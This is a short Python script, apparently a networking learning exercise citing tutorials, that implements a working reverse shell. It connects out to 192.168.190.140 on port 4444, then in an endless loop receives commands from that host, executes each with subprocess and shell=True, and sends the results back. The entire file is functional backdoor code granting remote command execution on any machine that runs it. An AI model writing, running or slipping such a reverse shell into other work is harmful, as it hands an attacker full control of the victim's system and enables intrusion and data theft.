# https://www.tutorialspoint.com/python/python_networking.htm
# https://docs.python.org/2/library/socket.html
import socket
import subprocess


def execute_system_command(command):
    return subprocess.check_output(command, shell=True)  # Returns the result of the executed command


# AF_INET: 'address family: Internet Protocol v4', SOCK_STREAM: 'TCP socket type'
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.190.140", 4444))  # connect() takes a tuple

connection.send("\n[+] Connection established\n")

while True:
    command = connection.recv(1024)  # Buffer size 1024
    command_result = execute_system_command(command)
    connection.send(command_result)


connection.close()
